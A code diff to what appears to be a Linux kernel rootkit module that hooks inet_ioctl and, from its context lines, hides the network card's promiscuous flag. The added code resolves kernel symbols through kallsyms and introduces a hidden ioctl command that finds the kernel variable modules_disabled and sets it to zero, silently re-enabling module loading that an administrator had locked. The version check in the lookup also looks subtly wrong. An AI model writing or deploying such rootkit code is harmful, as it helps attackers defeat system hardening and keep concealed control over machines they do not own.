@@ -8,6 +8,7 @@
 #include <net/tcp.h>
 #include <net/udp.h>
 #include <linux/init.h>
+#include <linux/kallsyms.h>
 
 #define TMPSZ 150
 
@@ -612,6 +613,43 @@ unsigned int n_dev_get_flags ( const struct net_device *dev )
     return ret;
 }
 
+struct ksym {
+    char *name;
+    unsigned long addr;
+};
+
+int find_ksym ( void *data, const char *name, struct module *module, unsigned long address )
+{
+    struct ksym *ksym = (struct ksym *)data;
+    char *target = ksym->name;
+
+    if ( strncmp(target, name, KSYM_NAME_LEN) == 0 )
+    {
+        ksym->addr = address;
+        return 1;
+    }
+
+    return 0;
+}
+
+unsigned long get_symbol ( char *name )
+{
+    unsigned int ret;
+    unsigned long symbol = 0;
+    struct ksym ksym;
+
+    #if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 32, 0)
+    symbol = kallsyms_lookup_name("modules_disabled");
+    #else
+    ksym.name = name;
+    ksym.addr = 0;
+    ret = kallsyms_on_each_symbol(&find_ksym, &ksym);
+    symbol = ksym.addr;
+    #endif
+
+    return symbol;
+}
+
 static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
 {
     int ret;
@@ -869,6 +907,20 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                 DEBUG("Unhiding PROMISC flag\n");
 
                 hide_promisc = 0;
+                break;
+
+            /* Enable module loading */
+            case 15:
+                {
+                    int *modules_disabled;
+
+                    DEBUG("Enabling module loading\n");
+
+                    modules_disabled = (int *)get_symbol("modules_disabled");
+
+                    if ( modules_disabled )
+                        *modules_disabled = 0;
+                }
                 break;
 
             default:
